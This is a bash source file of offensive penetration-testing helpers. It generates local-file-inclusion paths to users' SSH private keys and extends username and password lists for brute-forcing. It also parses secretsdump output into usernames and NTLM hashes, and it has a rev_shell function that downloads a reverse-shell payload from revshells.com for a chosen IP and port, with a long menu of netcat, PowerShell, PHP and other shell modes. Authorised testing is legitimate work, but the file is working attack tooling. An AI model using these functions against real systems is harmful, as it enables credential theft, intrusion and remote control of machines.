#!/bin/bash


# TODO: Doc
# Description:
# Usage:
# Arguments:
# Example:
function payload_lfi_ssh_path() {
    local input="$1"
    local prefix="$2"
    local algos=("id_rsa" "id_dsa" "id_ecdsa" "id_ed25519")

    # file mode
    if [[ -f "$input" ]]; then
        while IFS= read -r user; do
            for algo in "${algos[@]}"; do
                echo "${prefix}home/$user/.ssh/$algo"
            done
        done < "$input"
    else
        # single username
        for algo in "${algos[@]}"; do
            echo "${prefix}home/$input/.ssh/$algo"
        done
    fi
}

# Description: merge files into one file. Especially used for merging wordlists.
# Usage: merge <file1> <file2> ... [-o <output>] [-s <statistic>]
# Arguments:
#  -o|--output: Output file name (default: merged.txt)
#  -s|--statistic: greate a statistic of your merges (default: true)
# Example:
#   # To combine wordlists for subdomain enumeration:
#   merge /usr/share/wordlists/amass/subdomains-top1mil-110000.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/fierce-hostlist.txt \
#         /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
#         -o subdomain+vhost-default.txt
function merge() {
    local output="merged.txt"
    local statistic=true
    local files=()
    local total_lines=0

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -o|--output)
                output="$2"
                shift 2
                ;;
            -s|--statistic)
                statistic="$2"
                shift 2
                ;;
            *)
                files+=("$1")
                shift
                ;;
        esac
    done

    if [[ "${#files[@]}" -lt 2 ]]; then
        swiss_logger error "[e] At least two files to merge."
        return 1
    fi

    for file in "${files[@]}"; do
        if [[ ! -f "$file" ]]; then
            swiss_logger error "[e] File not found: $file"
            return 1
        fi
    done

    local temp_output=$(mktemp)

    for file in "${files[@]}"; do
        total_lines=$((total_lines + $(wc -l < "$file")))
        sort -u "$file" >> "$temp_output"
    done

    sort -u "$temp_output" -o "$output"
    rm "$temp_output"

    local unique_lines
    unique_lines=$(wc -l < "$output")
    local duplicates_removed=$((total_lines - unique_lines))

    if [[ "$statistic" == true ]]; then
        local stat_file="$output.statistic"
        {
            echo "Original filenames:"
            for file in "${files[@]}"; do
                echo "  - $file"
            done
            echo "Line counts per file:"
            for file in "${files[@]}"; do
                echo "  - $file: $(wc -l < "$file") lines"
            done
            echo "Total line count before merge: $total_lines"
            echo "Total line count after merge: $unique_lines"
            echo "Lines saved after merge (duplicates removed): $duplicates_removed"
        } > "$stat_file"
    fi

    swiss_logger info "[i] Files merged into $output"
    [[ "$statistic" == true ]] && swiss_logger info "[i] Statistics saved to $stat_file"
}

# Description: Extend your credential file like hydra -e nsr
function payload_extend_credential_file() {
    local username_file="${1:-$PWD/username.txt}"
    local password_file="${2:-$PWD/password.txt}"

    if [[ ! -f "$username_file" || ! -f "$password_file" ]]; then
        swiss_logger error "[e]: Either username_file or password_file does not exist."
        return 1
    fi

    local tmp_user_file=$(mktemp)
    local tmp_pass_file=$(mktemp)

    while read -r username; do
        echo "$username" >> "$tmp_user_file"
        echo "$(echo "$username" | rev)" >> "$tmp_user_file"
        echo "$(echo "$username" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')" >> "$tmp_user_file"
    done < "$username_file"

    sort -u "$tmp_user_file" -o "$username_file"

    cp "$username_file" "$tmp_pass_file"
    echo "" >> "$tmp_pass_file"

    \cat "$password_file" >> "$tmp_pass_file"
    sort -u "$tmp_pass_file" -o "$password_file"

    rm -f "$tmp_user_file" "$tmp_pass_file"

    swiss_logger info "[i] Extended username and password files."
}

# parse secretdump output into username / hashes
# combo with nxc
function payload_secretdump() {
    local input_file="$1"
    local user_file="secretdump.user.txt"
    local hash_file="secretdump.hash.txt"

    echo -n "" > "$user_file"
    echo -n "" > "$hash_file"

    grep -A 1000 "\[*\] Reading and decrypting hashes from ntds.dit" "$input_file" | \
    grep -E "^[^:]+:[0-9]+:[0-9a-f]{32}:[0-9a-f]{32}" | \
    while IFS=: read -r username rid lmhash nthash rest; do
        echo "$username" >> "$user_file"
        echo "$lmhash:$nthash" >> "$hash_file"
    done

    echo "Parsed usernames saved to $user_file"
    echo "Parsed NTLM hashes saved to $hash_file"
}


# Usage: rev_shell
# TODO: Doc
# TODO: built-in encode
# TODO: env default port
# TODO: list options for shell type
# TODO: fix revshell issue on 42 (Powershell base64)
function rev_shell() {
    swiss_logger prompt "[i] Enter IP (Default: $(_get_default_network_interface_ip)): \c"
    read -r IP
    local IP=${IP:-$(_get_default_network_interface_ip)}

    swiss_logger prompt "[i] Port (Default: 9000): \c"
    read -r PORT
    local PORT=${PORT:-9000}

    local -a allowed_shell_types=("sh" "/bin/sh" "bash" "/bin/bash" "cmd" "powershell" "pwsh" "ash" "bsh" "csh" "ksh" "zsh" "pdksh" "tcsh" "mksh" "dash")

    function is_valid_shell_type() {
        local shell="$1"
        for valid_shell in "${allowed_shell_types[@]}"; do
            if [[ "$shell" == "$valid_shell" ]]; then
                return 0
            fi
        done
        return 1
    }

    while true; do
        swiss_logger prompt "[i] supported shell type: $allowed_shell_types"
        swiss_logger prompt "[i] Enter Shell (Default: /bin/bash): \c"
        read -r SHELL_TYPE
        SHELL_TYPE=${SHELL_TYPE:-"/bin/bash"}

        if is_valid_shell_type "$SHELL_TYPE"; then
            break
        else
            swiss_logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
        fi
    done

    # stripping color
    swiss_logger info ""

    local PS3="Please select the Mode (number): "
    local -a bash_options=( "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp" "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c" "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat" "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1" "OpenSSL" "Perl" "Perl no sh" "Perl PentestMonkey" "PHP PentestMonkey" "PHP Ivan Sincek" "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec" "PHP system" "PHP passthru" "PHP \`" "PHP popen" "PHP proc_open" "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)" "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2" "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1" "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1" "Java #2" "Java #3" "Java Web" "Java Two Way" "Javascript" "Groovy" "telnet" "zsh" "Lua #1" "Lua #2" "Golang" "Vlang" "Awk" "Dart" "Crystal (system)" "Crystal (code)")

    local MODE
    select MODE in "${bash_options[@]}"; do
      if [[ -n "$MODE" ]]; then
        swiss_logger info "[i] Mode $MODE selected."
        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
        break
      else
        swiss_logger error "[e] Invalid selection, please try again."
      fi
    done

    local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
    local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"

    swiss_logger debug "[d] Request=$URL"
    local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")

    if [[ "$HTTP_STATUS" -eq 200 ]]; then
        curl -s "${URL}" | xclip -selection clipboard
        swiss_logger info "[i] payload copied."
    else
        swiss_logger error "[e] Status $HTTP_STATUS"
    fi
}